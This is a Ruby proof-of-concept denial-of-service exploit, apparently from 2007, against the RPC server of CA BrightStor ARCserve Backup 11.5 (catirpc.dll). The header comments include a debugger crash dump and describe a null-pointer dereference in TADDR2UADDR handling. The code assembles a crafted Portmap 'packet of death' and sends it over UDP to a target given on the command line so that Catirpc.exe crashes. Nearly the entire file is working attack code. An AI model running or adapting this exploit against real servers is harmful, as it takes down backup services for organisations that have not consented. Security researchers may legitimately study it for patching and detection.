#!/usr/bin/ruby
#  
# Computer Associates (CA) Brightstor Backup Remote Procedure Call 
Server DoS (catirpc.dll)
#
# Catirpc.exe - Provides the endpoint mapper and enables RPC services 
for BrightStor Backup products.
# 
# (7c.350): Access violation - code c0000005 (!!! second chance !!!)
# eax=007ef924 ebx=2e009560 ecx=00325ad8 edx=007ef900 esi=00000000 
edi=00324308
# eip=2e00eda8 esp=007ef8b8 ebp=2e00be00 iopl=0         nv up ei pl nz 
na po nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             
efl=00000206
# *** WARNING: Unable to verify checksum for C:\Program 
Files\CA\BrightStor ARCserve 
# Backup\CATIRPC.dll
# *** ERROR: Symbol file could not be found.  Defaulted to export 
symbols for C:\Program 
# Files\CA\BrightStor ARCserve Backup\CATIRPC.dll - 
# CATIRPC_2e000000!get_hostbyname+478:
# 2e00eda8 668b4602         mov     ax,[esi+0x2]          
ds:0023:00000002=???? 
#
# CATIRPC.dll does not properly handle TADDR2UADDR procedures used in 
RPC communications with
# the CA RPC Server (Catirpc.exe). This leads to a condition where a 
null memory pointer
# is dereferenced. This appears to be only a DoS, but please prove me 
otherwise. This was tested on
# BrightStor ARCserve Backup 11.5.2.0 (SP2)
#
# (c) Copyright 2007 Shirkdog i 
#
# Author: M. Shirk (Shirkdog) shirkdog_list ^ at % hotmail.com
# Thanks to Tebodell for testing
#
# Greetz to str0ke, Galileo. Metasploit module to follow

require 'socket'

backup_server = (ARGV[0])
target_port = (ARGV[1] || 111) 

#RPC/Portmap packet
packet_of_death= 
"\xde\xad\xbe\xef"  + # XID
"\x00\x00\x00\x00" + # Message Type: Call (0)
"\x00\x00\x00\x02" + # RPC Version: 2
"\x00\x01\x86\xa0" + # Program: Portmap
"\x00\x00\x00\x03" + # Program Version: 3
"\x00\x00\x00\x08" + # Procedure: TADDR2UADDR (8)
"\x00\x00\x00\x00\x00\x00\x00\x00" +
"\x00\x00\x00\x00\x00\x00\x00\x00" + #Credentials and Verifier all NULL
"\x46\x9b\x22\xe2" + # Portmap data
"\x00\x00\x00\x00" + # Nulls that get processed during address shifting
"\x00\x00\x00\x00" +
"\x00\x00\x00\x00" 

puts "[+]Computer Associates (CA) Brightstor ARCServe Backup Remote 
Procedure Call Server DoS (catirpc.dll)\n"
puts "[+]Author: Shirkdog\n\n"

if (!(backup_server && target_port))
	puts "Usage: catirpcdos.rb host port (default port: 111)\n"
	exit
else
	puts "[+]Sending UDP Packet of Death...\n"	
	sock = UDPSocket.open
	sock.connect(backup_server, target_port.to_i)
	sock.send(packet_of_death, 0)
	puts "[+]Done...\n[+]Catirpc.exe is dead\n[+]... or it will die 
in a few seconds for you inpatient bastards\n"
end

